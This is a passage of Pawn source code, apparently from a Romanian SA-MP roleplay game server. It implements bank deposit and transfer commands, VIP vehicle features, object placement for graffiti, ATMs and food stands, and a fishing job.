	if(!(0 <= money <= 800000000)) return SendErrorMsg(playerid, "Nu poti depozita mai mult de $800.000.000!");
	if(GetPlayerCash(playerid) < money) return SendErrorMsg(playerid, "Nu ai aceasta suma de banii!");
	if(TradeID[playerid] != -1) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
	
	GivePlayerCash(playerid, -money);
	GivePlayerBank(playerid, money);
	SavePlayerBank(playerid);
	format(gString, sizeof gString, "A depositat $%s money din banca.", FormatNumber(money));
	InsertLog(playerid, gString, LOG_MONEY);

	va_SendClientMessage(playerid, 0xFAAC25FF, "You have deposited $%s into your bank account. Your account balance is now $%s.", FormatNumber(money), formatBytes(bank[playerid]));
	if(PlayerInfo[playerid][pShowBanca] == 1) return va_PlayerTextDrawSetString(playerid, BancaTD, "$%s", formatBytes(bank[playerid]));
	return true;
}
cmd:depositm(playerid, params[]) {
	if(PlayerInfo[playerid][pVip]<2) return true;
    if(!IsAtBank(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a putea folosi aceasta comanda, trebuie sa fii intr-o banca!");
	new money;
	if(sscanf(params, "i", money)) return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/depositm <miliarde>");
	if(money<=0||money>800000000) return SendClientMessage(playerid, COLOR_WHITE, "invalid money!");
	if(ByteVar1@money[playerid]<eBit:money) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai aceasta suma pe care vrei sa o depozitezi.");
	if(TradeID[playerid] != -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
	ByteVar1@bank[playerid] += eBit:money;
	ByteVar1@money[playerid] -= eBit:money;
	SavePlayerBank(playerid);
	format(gString, sizeof gString, "A depositat $%s.000.000.000 money din banca.", FormatNumber(money));
	InsertLog(playerid, gString, LOG_MONEY);
	SCMf(playerid, 0xFAAC25FF, "You have deposited $%d.000.000.000 into your bank account. Your account balance is now $%s.", money, formatBytes(bank[playerid]));
	if(PlayerInfo[playerid][pShowBanca] == 1) {
		format(gString, 128, "$%s", formatBytes(bank[playerid]));
		PlayerTextDrawSetString(playerid, BancaTD, gString);
	}
	return true;
}
cmd:balance(playerid, params[]) {
	if(!IsAtBank(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a putea folosi aceasta comanda, trebuie sa fii intr-o banca!");
	SCMf(playerid, COLOR_WHITE, "Balance: $%s", formatBytes(bank[playerid]));
	return true;
}
cmd:transfer(playerid, params[]) {
	if PlayerInfo[playerid][pLevel] < 5 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a putea folosi aceasta comanda, ai nevoie de minim level 5.");
	
	if !IsAtBank(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Pentru a putea folosi aceasta comanda, trebuie sa fii intr-o banca!");

	if LastPlayer==PlayerInfo[playerid][pSQLID] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti licita in timpul unei licitatie.");

	if TradeID[playerid] != -1 *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti folosi aceasta comanda atata timp cat esti implicat intr-o afacere!");
	
	extract params -> new player:id, moneytransfer; else 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/transfer <playerid/name> <Suma>");
	
	if !strcmp(GetIPP(playerid), GetIPP(id), true) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti transfer bani de pe acelasi IP.");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if playerid == id *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti executa aceasta comanda asupra ta!");

	if !togTransfer[id] *then 
		return SendClientMessage(playerid, COLOR_GREY, "Acel player are transfer-ul oprit.");

	if !ProxDetectorS(30.0, playerid, id) && moneytransfer > 100000000 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti transfera mai mult de $100.000.000 daca nu este langa tine!");

	if moneytransfer < 10000 || moneytransfer > 500000000 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Poti transfera minim $10,000 si maxim $500,000,000!");

	if GetPlayerBank(playerid) < moneytransfer *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Fonduri insuficiente.");

	listitemm[playerid] = id;
	TransferMoney[playerid] = moneytransfer;	
	new cashbank = TransferMoney[playerid]/100;	
	format(gString, 128, "Esti sigur ca vrei sa transferi %s$ lui %s?\nTaxa este $%s.",FormatNumber(moneytransfer),GetName(id),FormatNumber(cashbank));
	ShowPlayerDialog(playerid, DIALOG_TRANSFER, DIALOG_STYLE_MSGBOX, "Transfer:", gString, "Yes", "No");
	return true;
}
cmd:staff(playerid, params[]) {
	if !IsAdmin(playerid, 5) *then 
		return true;

	ShowPlayerDialog(playerid, DIALOG_STAFF, DIALOG_STYLE_LIST, "Staff", "Admins\nHelpers\nLeaders", "Ok", "Close");
	return true;		
}
stock IsSeatTaken(vehicleid, seatid) { 
 	foreach(new i : VehOccupeid<vehicleid>) if GetPlayerVehicleSeat(i)==seatid *then return true;
    return false;
}
cmd:factions(playerid, params[]) {
	gString[0] = (EOS);
	strcat(gString, "Faction name\tMembers\tLevel\tApplications\n");
	new i=0;
	while(++i<=MAX_FACTIONS)
		format(gQuery, 128, "%d. %s\t%02d/%02d\t%d\t%s\n", i, FactionName(i), FactionMembers[i], DynamicFactions[i][fMaxMembers], DynamicFactions[i][fLevel], DynamicFactions[i][fApp]?("{2FC914}Opened"):("{FF0000}Closed")), strcat(gString, gQuery);
	
	ShowPlayerDialog(playerid, DIALOG_FACTIONS, DIALOG_STYLE_TABLIST_HEADERS, "Factiuni:", gString, "Ok", "Close");
	return true;
}

cmd:youtubers(playerid, params[]) {
	SendClientMessage(playerid, -1, "-- Online Youtubers --");
	foreach(new i : youtubers) SCMf(playerid, -1, "{FFCC99}* Player %s(%d).", GetName(i), i);
	SCMf(playerid, -1, "* There are %d youtubers online.", Iter_Count(youtubers));
	return true;
}

cmd:yc(playerid, params[]) {
	if DeelayCommand[playerid][8]>gettime() *then 
		return DeelayTime(playerid, 8);

	if(!Iter_Contains(youtubers, playerid) && !PlayerInfo[playerid][pAdmin])
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti youtuber!");

	if(PlayerInfo[playerid][pMuteTime]) 
		return SCMf(playerid, COLOR_GREY, "You can't use commands right now! You are muted. (%d seconds)", PlayerInfo[playerid][pMuteTime]);

	if(sscanf(params, "s[128]", params))
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/yc <text>");

	format(gString, sizeof gString, "# YouTuber %s: %s", GetName(playerid), params);
	foreach(new p : youtubers)
		SendClientMessage(p, 0x2BB3FDFF, gString);

	foreach(new p : Staff<ADMIN>) {
		if(Iter_Contains(youtubers, p)) continue;
		SendClientMessage(p, 0x2BB3FDFF, gString);
	}

	DeelayCommand[playerid][8] = gettime() + 5;
	return true;
}

cmd:flip(playerid, params[]) {
	if !IsAdmin(playerid, 1) && PlayerInfo[playerid][pPremiumAccount] != 2 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "* Nu ai Premium Account PLUS!");

	if !IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "* Nu esti intr-un vehicul!");

	if PlayerInfo[playerid][pVip] > 0 && PlayerInfo[playerid][pWantedLevel] != 0 *then 
		return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda atata timp cat ai wanted!");

    if DeelayCommand[playerid][30] > gettime() && !PlayerInfo[playerid][pAdmin] *then
    	return DeelayTime(playerid, 30);

    DeelayCommand[playerid][30] = gettime()+(PlayerInfo[playerid][pVip]!=3?300:150);
    new Float:angle;
    GetVehicleZAngle(GetPlayerVehicleID(playerid), angle);
    SetVehicleZAngleEx(GetPlayerVehicleID(playerid), angle);
	return true;
}

cmd:flipcar(playerid, params[]) {
	if !IsAdmin(playerid, 1) *then
		return true;

	params[0] = GetPlayerVehicleID(playerid);
	extract params -> new vehicleid=params[0]; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/flipcar <vehicleid>");

	if !IsValidVehicle(vehicleid) *then
		return SendClientMessage(playerid, COLOR_GREY, "Invalid vehicleid!");

    new Float:angle;
    GetVehicleZAngle(vehicleid, angle);
    SetVehicleZAngleEx(vehicleid, angle);
	return true;
}
redist::valid_vip_vehicle(vehid) {
	switch(vehid) {
		case 560: return true;
		case 541: return true;
		case 429: return true;
		case 495: return true;
		case 579: return true;
		case 562: return true;
		case 451: return true;
		case 480: return true;
		case 411: return true;
	}
	return false;
}

cmd:vipmenu(playerid) {
	if !IsPlayerInAnyVehicle(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu esti intr-un vehicul!");

    new idd;

	if((idd = PersonalCar(playerid)) == -1) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in unul dintre vehiculele tale personale!");

	if(CarInfo[idd][Spawned] != GetPlayerVehicleID(playerid)) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti in vehiculul tau.");

	if strlen(CarInfo[idd][cText]) < 3 *then
		return SendClientMessage(playerid, -1, "Acest vehicul nu este unul VIP!");

	ShowPlayerDialog(playerid, DIALOG_VIPNAME, DIALOG_STYLE_LIST, "{f4ad42}VIP{FFFFFF} Menu", "Change vip name text\nChange text color\nSet text position\nReset to default", "Select", "Cancel");
	return true;
}
redist::EditVipCar(playerid, vssid) {
	new Float:fPos[3];
       
	GetVehiclePos(GetPlayerVehicleID(playerid), fPos[0], fPos[1], fPos[2]); 
	CarInfo[vssid][cVipPos][0] = CarInfo[vssid][cVipPos][0]+fPos[0];
	CarInfo[vssid][cVipPos][1] = CarInfo[vssid][cVipPos][1]+fPos[1];
	CarInfo[vssid][cVipPos][2] = CarInfo[vssid][cVipPos][2]+fPos[2];

	nameobject[CarInfo[vssid][Spawned]] = CreateDynamicObject(19327, CarInfo[vssid][cVipPos][0], CarInfo[vssid][cVipPos][1], CarInfo[vssid][cVipPos][2], CarInfo[vssid][cVipPos][3], CarInfo[vssid][cVipPos][4], CarInfo[vssid][cVipPos][5]);
	new name[40];
	format(name, sizeof(name), "{%s}%s", serverColors(CarInfo[vssid][cTextColor]), CarInfo[vssid][cText]);
	SetDynamicObjectMaterialText(nameobject[CarInfo[vssid][Spawned]], 0, name, OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
	EditDynamicObject(playerid, nameobject[CarInfo[vssid][Spawned]]);
	editObjectType[playerid] = 1;
	EditVehicleID[playerid] = vssid;
	return true;
}
public OnVehicleSpawn(vehicleid) {
	if(Carspawn[vehicleid]) {
		DestroyVehicleEx(vehicleid, "");
		Carspawn[vehicleid] = false;
	}
	CarRadio[vehicleid] = 0;
	new playerid = vehiclePlayerID[vehicleid];
	if(playerid!=INVALID_PLAYER_ID) {
		if(VehicleRent[playerid]) return destroy_rent_car(playerid);
		switch(GetVehicleModel(vehicleid)) {
			case 435,591,584,450: {
				new Float:x,Float:y,Float:z;
				GetVehiclePos(JobVehicle[playerid], x, y, z);
				SetVehiclePos(Trailer[playerid], x+5.0, y+5.0, z);
			}
		}
	}
	SetVehicleVirtualWorld(vehicleid, 0);
	if(ServerVehicles[vehicleid][vID]) {
		Gas[vehicleid] = 100;
		if(InWarTurf[ServerVehicles[vehicleid][vFaction]] != -1) SetVehicleVirtualWorld(vehicleid, InWarTurf[ServerVehicles[vehicleid][vFaction]]);
	}
	new idd;
	if((idd=FindSpawnID(vehicleid))!=-1) {
		if(CarInfo[idd][cGarage]!=-1) SetVehicleVirtualWorld(vehicleid, vehicleid);
		CarInfo[idd][cTime] = 600;
		new engine, lights, alarm, doors, bonnet, boot, objective;
		GetVehicleParamsEx(CarInfo[idd][Spawned], engine, lights, alarm, doors, bonnet, boot, objective);
		SetVehicleParamsEx(CarInfo[idd][Spawned], engine, lights, alarm, CarInfo[idd][cLock], bonnet, boot, objective);
	}
	return true;
}

redist::sql_cache_insert_stand(i) {
	standInfo[i][_sID] = cache_insert_id();
	format(gString, 128, "{32A852}Eat Stand #%d\n{FFFFFF}Price: {32A852}$5,000\n{FFFFFF}Use ({32A852}/eat{FFFFFF}) to eat it", standInfo[i][_sID]);
	CreateDynamic3DTextLabel(gString, -1, standInfo[i][_sX], standInfo[i][_sY], standInfo[i][_sZ], 20.0);
	return true;
}

public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz) {
	if(response == EDIT_RESPONSE_FINAL) {
		switch(editObjectType[playerid]) {
			case 1: {
				new 
					vssidd = EditVehicleID[playerid], Float:ofx, Float:ofy, Float:ofz, Float:ofaz,
		        	Float:finalx, Float:finaly, Float:px, Float:py, Float:pz, Float:roz, car = GetPlayerVehicleID(playerid)
		        ;
		        GetVehiclePos(car, px, py, pz);
		        GetVehicleZAngle(car, roz);

		        ofx = x-px;
		        ofy = y-py;
		        ofz = z-pz;
		        ofaz = rz-roz;
		        finalx = ofx*floatcos(roz, degrees)+ofy*floatsin(roz, degrees);
		        finaly = -ofx*floatsin(roz, degrees)+ofy*floatcos(roz, degrees);

				CarInfo[vssidd][cVipPos][0] = finalx;
				CarInfo[vssidd][cVipPos][1] = finaly;
				CarInfo[vssidd][cVipPos][2] = ofz;
				CarInfo[vssidd][cVipPos][3] = rx;
				CarInfo[vssidd][cVipPos][4] = ry;
				CarInfo[vssidd][cVipPos][5] = ofaz;
				AttachDynamicObjectToVehicle(nameobject[CarInfo[vssidd][Spawned]], CarInfo[vssidd][Spawned], CarInfo[vssidd][cVipPos][0], CarInfo[vssidd][cVipPos][1], CarInfo[vssidd][cVipPos][2], CarInfo[vssidd][cVipPos][3], CarInfo[vssidd][cVipPos][4], CarInfo[vssidd][cVipPos][5]);
				Save_VipCoordonat(vssidd);
				attach_vip_text(vssidd);
				editObjectType[playerid] = 0;
				SendClientMessage(playerid, -1, "{f4ad42}VIP MENU: {FFFFFF}Text pozitionat cu succes!");
			}
			case 2: {
				SQL_clanzone++;
				new i = SQL_clanzone;
		       	GraffitiInfo[i][gfX] = x;
		       	GraffitiInfo[i][gfY] = y;
		     	GraffitiInfo[i][gfZ] = z;
		     	GraffitiInfo[i][gfRotX] = rx;
		     	GraffitiInfo[i][gfRotY] = ry;
		     	GraffitiInfo[i][gfRotZ] = rz;
		       	GraffitiInfo[i][gfOwned] = false;
		       	GraffitiInfo[i][gfPlayerSpray] = -1;

		       	ClanInfo[GraffitiInfo[i][gfOwned]][clTop]++;
		     	if(ClanInfo[GraffitiInfo[i][gfOwned]][clTop]>ClanInfo[ClanTop][clTop]) ClanTop=i;

		     	ClanTurfs[i] = GangZoneCreate(GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfX], GraffitiInfo[i][gfY]);

		     	new areaid = CreateDynamicRectangle(GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfX], GraffitiInfo[i][gfY]);
		     	AreaType[areaid] = AREA_CLANZONE;
			    AreaID[areaid] = i;

		       	DestroyDynamicObject(objectid);
		       	mysql_format(SQL, gQuery, 180, "INSERT INTO `graffiti` (`X`, `Y`, `Z`, `RotX`, `RotY`, `RotZ`) VALUES ('%f', '%f', '%f', '%f', '%f', '%f')", GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
		       	mysql_tquery(SQL, gQuery, "SQL_insert_graffiti", "i", i);

				GraffitiInfo[i][gfObject] = CreateDynamicObject(19353, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
			    if(GraffitiInfo[i][gfOwned] == 0 ) gString = "Clan Name\nClan Tag";
			    else format(gString, 60, "{%s}%s\n%s", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], ClanInfo[GraffitiInfo[i][gfOwned]][clName], ClanInfo[GraffitiInfo[i][gfOwned]][clTag]);
			    SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
				editObjectType[playerid] = 0;
			}
			case 3: {
				new 
					vehicleid = EditVehicleID[playerid], Float:ofx, Float:ofy, Float:ofz, Float:ofaz,
		        	Float:finalx, Float:finaly, Float:px, Float:py, Float:pz, Float:roz
		        ;
		        GetVehiclePos(vehicleid, px, py, pz);
		        GetVehicleZAngle(vehicleid, roz);

		        ofx = x-px;
		        ofy = y-py;
		        ofz = z-pz;
		        ofaz = rz-roz;
		        finalx = ofx*floatcos(roz, degrees)+ofy*floatsin(roz, degrees);
		        finaly = -ofx*floatsin(roz, degrees)+ofy*floatcos(roz, degrees);

				AttachDynamicObjectToVehicle(VehicleOBJ[vehicleid][0], vehicleid, finalx, finaly, ofz, rx, ry, ofaz);
				editObjectType[playerid] = 0;
				SendClientMessage(playerid, -1, "{F4AD42}Fare MENU: {FFFFFF}text pozitionat cu success!");
			}
			case 4: {
				sql_eatstand++;
				new i = sql_eatstand;
				standInfo[i][_sX] = x;
				standInfo[i][_sY] = y;
				standInfo[i][_sZ] = z;
				standInfo[i][_sRot] = rz;
				editObjectType[playerid] = 0;
				mysql_format(SQL, gQuery, 180, "INSERT INTO `eat_stand` (`X`, `Y`, `Z`, `Rot`) VALUES ('%f', '%f', '%f', '%f')", x, y, z, rz);
				mysql_tquery(SQL, gQuery, "sql_cache_insert_stand", "i", sql_eatstand);
			}
			case 5: {
				new i=cache_atm;
				atmInfo[i][aX] = x;
				atmInfo[i][aY] = y;
				atmInfo[i][aZ] = z;
				atmInfo[i][aR] = rz;
				atmInfo[i][aObject] = objectid;
				editObjectType[playerid] = 0;
				mysql_format(SQL, gQuery, 180, "INSERT INTO `atm` (`X`, `Y`, `Z`, `R`) VALUES ('%f', '%f', '%f', '%f')", x, y, z, rz);
				mysql_tquery(SQL, gQuery, "sql_cache_insert_atm", "ii", playerid, i);
				cache_atm++;
			}
			case 6: {
				new i=EditVehicleID[playerid];
				atmInfo[i][aX] = x;
				atmInfo[i][aY] = y;
				atmInfo[i][aZ] = z;
				atmInfo[i][aR] = rz;
				atmInfo[i][aObject] = objectid;
				editObjectType[playerid] = 0;
				AreaType[CreateDynamicSphere(x,y,z, 3.0)] = AREA_ATM;
				_query("UPDATE `atm` SET `X` = '%f', `Y` = '%f', `Z` = '%f', `R` = '%f' WHERE `ID` = '%d'", x, y, z, rz, atmInfo[i][aID]);

				SCMf(playerid, COLOR_YELLOW, "Ai mutat cu success ATM-ul #%d!", atmInfo[i][aID]);
			}
		}
	}
	else if(response == EDIT_RESPONSE_CANCEL) {
		switch(editObjectType[playerid]) {
			case 1: {
				DestroyDynamicObject(nameobject[CarInfo[EditVehicleID[playerid]][Spawned]]);
				attach_vip_text(EditVehicleID[playerid]);
				EditVehicleID[playerid] = -1;
				editObjectType[playerid] = 0;
			}
			case 2,4,5: {
				DestroyDynamicObject(objectid);
				editObjectType[playerid] = 0;
				EditVehicleID[playerid]=-1;
			}
			case 3: {
				DestroyDynamicObject(objectid);
				VehicleOBJ[gLastCar[playerid]][0]=INVALID_OBJECT_ID;
				editObjectType[playerid] = 0;
				Fare[playerid] = 0;
				TaxiDuty[playerid] = false;
				GivePlayerCash(playerid, TaxiMoney[playerid]);
				TaxiMoney[playerid] = 0;
				SendClientMessage(playerid, -1, "{F4AD42}Fare MENU: {FFFFFF}Ai anulat pozitionarea!");
				foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) PlayerTextDrawHide(i, FareTD);
			}
		}
	}
	return true;
}
redist::sql_cache_insert_atm(playerid, i) {
	atmInfo[i][aID] = cache_insert_id();
	SCMf(playerid, COLOR_YELLOW, "* ATM #%d a fost creat cu success.", atmInfo[i][aID]);

	format(gString, 128, "{4AA529}ATM #%d\n{FFFFFF}(/withdraw)", atmInfo[i][aID]);
	atmInfo[i][aText] = CreateDynamic3DTextLabel(gString, -1, atmInfo[i][aX], atmInfo[i][aY], atmInfo[i][aZ], 10.0);
	return true;
}
redist::SQL_insert_graffiti(i) return GraffitiInfo[i][gfID] = cache_insert_id();
stock attach_vip_text(idd) {
	if(strlen(CarInfo[idd][cText]) >= 3) return true;

	new name[82];
	nameobject[CarInfo[idd][Spawned]] = CreateDynamicObject(19327, -2597.0762, -2638.4270, -5.3536, -87.6999, 90.4001, -87.1805);
	format(name, sizeof(name), "{%s}%s", svColors(CarInfo[idd][cTextColor]), CarInfo[idd][cText]);
	SetDynamicObjectMaterialText(nameobject[CarInfo[idd][Spawned]], 0, name, OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1);
	AttachDynamicObjectToVehicle(nameobject[CarInfo[idd][Spawned]], CarInfo[idd][Spawned], CarInfo[idd][cVipPos][0], CarInfo[idd][cVipPos][1], CarInfo[idd][cVipPos][2], CarInfo[idd][cVipPos][3], CarInfo[idd][cVipPos][4], CarInfo[idd][cVipPos][5]);
	return true;
}

cmd:vipwheels(playerid, params[]) {
	if(!PlayerInfo[playerid][pVip]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai cont VIP!");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_LGREEN, "Nu esti intr-un vehicul!");
	new idd = PersonalCar(playerid);
	if(idd == -1) return true;
	ShowPlayerDialog(playerid, DIALOG_WHEELS, DIALOG_STYLE_LIST, "legendary Wheels", "Shadow\nCutter\nSwitch\nDollar", "Ok", "Exit");
	return true;
}
cmd:vips(playerid) return callcmd::viplist(playerid);
cmd:viplist(playerid) {
	va_SendClientMessage(playerid, COLOR_TEAL, "---------------------- VIP's List ----------------------");
	foreach(new i : All(PlayerVips)) va_SendClientMessage(playerid, COLOR_WHITE, "%s (%d)", GetName(i), i);
	va_SendClientMessage(playerid, COLOR_WHITE, "{ADFF5C}* Sunt %d jucatori conectati ce au cont VIP user.", Iter_Count(PlayerVips<NORMAL>)+Iter_Count(PlayerVips<LEGEND>));
	return SendClientMessage(playerid, COLOR_TEAL, "--------------------------------------------------------");
}
cmd:legends(playerid) {
	SendClientMessage(playerid, COLOR_TEAL, "---------------------- Legend List ----------------------");
	foreach(new i : PlayerVips<LEGEND>) va_SendClientMessage(playerid, COLOR_WHITE, "%s (%d)", GetName(i), i);
	va_SendClientMessage(playerid, COLOR_WHITE, "{ADFF5C}* Sunt %d jucatori conectati ce au cont LEGEND.", Iter_Count(PlayerVips<LEGEND>));
	return SendClientMessage(playerid, COLOR_TEAL, "--------------------------------------------------------");
}
cmd:nos(playerid, params[]) {
	if(IsACop(playerid) && OnDuty[playerid]) return callcmd::nos2(playerid, params);
	if(!PlayerInfo[playerid][pAdmin] && !PlayerInfo[playerid][pVip]) return SendErrorMsg(playerid, AdminOnly);
	if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMsg(playerid, "Nu esti intr-un vehicul!");
	if(PlayerInfo[playerid][pVip] == 1 && PlayerInfo[playerid][pWantedLevel] != 0) return SendErrorMsg(playerid, "Nu poti folosi aceasta comanda atata timp cat ai wanted!");
	if(DeelayCommand[playerid][33] > gettime() && !PlayerInfo[playerid][pAdmin]) return DeelayTime(playerid, 33);
   
    GivePlayerCash(playerid, -10000);
    AddVehicleComponent(GetPlayerVehicleID(playerid), 1010);
	DeelayCommand[playerid][33] = gettime()+120;
	return va_SendClientMessage(playerid, 0x00C700FF, "(NOS): {FFFFFF}Ti-ai pus nos pe vehiculul tau '%s' (%d) si ai platit $10.000.", aVehicleNames[GetVehicleModel(GetPlayerVehicleID(playerid))-400], GetPlayerVehicleID(playerid));
}

main() {}

stock set_fish_checkpoint(playerid) {
	new i=fishCount[playerid];
	switch(PlayerInfo[playerid][pJob]) {
    	case 11: SetPlayerCheckpoint(playerid, fish_cp_lv[i][0], fish_cp_lv[i][1], fish_cp_lv[i][2], 3.0);
    	case 13: SetPlayerCheckpoint(playerid, fish_cp_ls[i][0], fish_cp_ls[i][1], fish_cp_ls[i][2], 3.0);
    	case 16: SetPlayerCheckpoint(playerid, fish_cp_sf[i][0], fish_cp_sf[i][1], fish_cp_sf[i][2], 3.0);
    }
    CP[playerid] = 722;
	return true;
}

cmd:fish(playerid, params[]) {
	if(FishTimer[playerid])
		return true;

	if(fishCount[playerid]>=5) return true;

	if(!JobWorking[playerid]) {
		if(PlayerInfo[playerid][pJob] != 11 && PlayerInfo[playerid][pJob] != 13 && PlayerInfo[playerid][pJob] != 16) 
			return SendClientMessage(playerid, COLOR_GREY, "Nu esti pescar!");

		if(!IsPlayerInArea(playerid, 2230, 507.5, 2417, 563.5) && !IsPlayerInArea(playerid, 334.4, -2109.1, 425.4, -2076.1) && !IsPlayerInArea(playerid, -3000, 474.0, -2931, 512.0))
			return SendClientMessage(playerid, COLOR_GREY, "Nu esti in zona in care poti pescui.");

		if(IsPlayerInAnyVehicle(playerid)) 
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti aceasta comanda dintr-un vehicul!");

		if(PlayerInfo[playerid][pBackpack]) {
			switch(PlayerInfo[playerid][pVip]) {
				case 0: if(fishCount[playerid]) return SendClientMessage(playerid, -1, "Ai prins deja un peste, du-te la un magazin 24/7 pentru a-l vinde.");
				case 1,2: if(fishCount[playerid] > 1) return SendClientMessage(playerid, -1, "Ai prins deja 2 pesti, du-te la un magazin 24/7 pentru a-l vinde.");
				case 3: if(fishCount[playerid] > 2) return SendClientMessage(playerid, -1, "Ai prins deja 3 pesti, du-te la un magazin 24/7 pentru a-l vinde.");
			}
		}
		else if(fishCount[playerid]) return SendClientMessage(playerid, -1, "Ai prins deja un peste, du-te la un magazin 24/7 pentru a-l vinde.");

		if(PlayerInfo[playerid][pJobSkill][11]!=7) SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Job) {FFFFFF}Tip de munca selectat: normal.");
		else return ShowPlayerDialog(playerid, DIALOG_JOBTYPE, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}JOB {FFFFFF}Startwork", "Type\tStatus\nNormal Work\t{00FF00}Available\nSpecial Work\t{00FF00}Available", "Select", "Cancel");
		SendClientMessage(playerid, COLOR_WHITE, "You're now fishing. It will take a few seconds to reel your fish in.");

		GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~PLEASE WAIT~n~~w~~h~fishing...", 3000, 3);
		FishTimer[playerid] = 10;
		TogglePlayerControllable(playerid, 0);
		OnePlayAnim(playerid,"PED","IDLE_CHAT",4.0,0,0,0,0,10000);
		SetPlayerAttachedObject(playerid, 1, 18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
	} else {
		if(IsPlayerInAnyVehicle(playerid) && IsABoat(GetPlayerVehicleID(playerid)))
			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti pescuiesti din barca.");

		if(get_distance_fish(playerid) > 5)
			return SendClientMessage(playerid, COLOR_GREY, "You are not in the fishing zone.");

		DisablePlayerCheckpoint(playerid);
		CP[playerid] = 0;
		TogglePlayerControllable(playerid, false);
		SendClientMessage(playerid, COLOR_WHITE, "You're now fishing. It will take a few seconds to reel your fish in.");

		GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~PLEASE WAIT~n~~w~~h~fishing...", 3000, 3);
		FishTimer[playerid] = 10;
		SetPlayerAttachedObject(playerid, 1, 18632,6,0.079376,0.037070,0.007706,181.482910,0.000000,0.000000,1.000000,1.000000,1.000000);
		OnePlayAnim(playerid, "SAMP", "FishingIdle", 4.0, 1, 0, 0, 0, 0);
	}
	return true;
}
redist::Fish(playerid) {
	if(JobWorking[playerid]) {
		SendClientMessage(playerid, COLOR_YELLOW, "FISH ON! Press 'F' to catch it!");
		SendClientMessage(playerid, -1, "if you do not press the key within 10 seconds, you lose the fish.");
		new Float:x,Float:y,Float:z;
		GetPlayerPos(playerid, x, y, z);
		_fishObj[playerid] = CreateDynamicPickup(19630, 23, x,y,z+1.1, -1, -1, playerid);
		BagTime[playerid] = 10;
		return true;
	}
	new x; gString[0] = (EOS);
    RemovePlayerAttachedObject(playerid, 1);
	x = RandomEx(10000, 20000) + GetPlayerSkill(playerid)*500;
	switch(PlayerInfo[playerid][pMember]) {
		case 1,2,3,7,8,9,11,12,13,14,15: {}
		default: CheckMission(playerid, 9);
	}
	new rar = random(500);
	if(rar >= 450 && rar < 489) {
		x += RandomEx(30000, 40000);			
		format(gString, 128, "* %s caught a rare fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		NearMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_BLUE, "Ai prins un peste rar de $%s!", FormatNumber(x));
		SendClientMessage(playerid, -1, "Pentru a vinde pestele, mergi la un magazin 24/7 (/gps).");							
	}
	else if(rar >= 490) {
		x += RandomEx(40000, 60000);
		format(gString, 128, "* %s caught a very rare fish that can be sold for about $%s.", GetName(playerid), FormatNumber(x));
		NearMessage(playerid, COLOR_YELLOW, gString);	
		SCMf(playerid, COLOR_BLUE, "Ai prins un peste foarte rar de $%s!", FormatNumber(x));
		SendClientMessage(playerid, -1, "Pentru a vinde pestele, mergi la un magazin 24/7 (/gps).");		
	}
	else {
